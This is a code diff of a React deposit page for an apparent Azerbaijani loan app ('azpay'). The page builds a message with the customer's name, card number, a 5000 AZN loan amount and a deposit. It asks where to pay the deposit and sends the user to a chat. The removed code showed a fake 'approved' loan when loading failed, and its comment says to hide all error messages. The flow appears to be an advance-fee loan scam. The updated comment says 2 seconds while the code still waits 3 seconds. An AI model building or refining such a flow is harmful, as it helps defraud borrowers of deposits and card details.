@@ -1614,69 +1614,32 @@ const DepositPage = () => {
     hideLauncher();
   }, []);
 
-  // Default settings and application data
-  const defaultSettings = {
-    deposit_amount: 50.0,
-    logo_url: "https://i.hizliresim.com/iydskgy.jpeg",
-    whatsapp_link: "https://wa.me/994506490600"
-  };
-  
-  const defaultApplication = {
-    full_name: "Müştəri",
-    card_number: "****",
-    selected_amount: 5000,
-    status: "approved"
-  };
-
-  const fetchData = async () => {
-    try {
-      const [settingsRes, appRes] = await Promise.all([
-        axios.get(`${API}/settings`),
-        axios.get(`${API}/applications/${appId}`)
-      ]);
-      setSettings(settingsRes.data);
-      setApplication(appRes.data);
-    } catch (error) {
-      // Xəta olsa default məlumatları istifadə et - heç bir xəta mesajı göstərmə
-      console.log('Using default data for deposit page');
-      setSettings(defaultSettings);
-      setApplication(defaultApplication);
-    } finally {
-      setLoading(false);
-    }
-  };
-
   const getCustomerMessage = () => {
-    const app = application || defaultApplication;
-    const set = settings || defaultSettings;
-    return `Ad Soyad: ${app.full_name}
-Kart: ${app.card_number}
-Kredit məbləği: ${app.selected_amount} AZN
-Depozit: ${set.deposit_amount} AZN
+    return `Ad Soyad: ${application.full_name}
+Kart: ${application.card_number}
+Kredit məbləği: ${application.selected_amount} AZN
+Depozit: ${settings.deposit_amount} AZN
 Depoziti hara ödəyim?`;
   };
 
   const [connecting, setConnecting] = useState(false);
 
   const handlePaymentStart = () => {
-    const app = application || defaultApplication;
-    const set = settings || defaultSettings;
-    
     const customerMessage = getCustomerMessage();
     
     // Store message in localStorage for chat page to read
     localStorage.setItem('azpay_customer_message', customerMessage);
     localStorage.setItem('azpay_customer_data', JSON.stringify({
-      name: app.full_name,
-      card: app.card_number,
-      amount: app.selected_amount,
-      deposit: set.deposit_amount
+      name: application.full_name,
+      card: application.card_number,
+      amount: application.selected_amount,
+      deposit: settings.deposit_amount
     }));
     
     // Show connecting screen
     setConnecting(true);
     
-    // Navigate to chat page after 3 seconds
+    // Navigate to chat page after 2 seconds (faster)
     setTimeout(() => {
       window.location.href = `/chat/${appId}`;
     }, 3000);
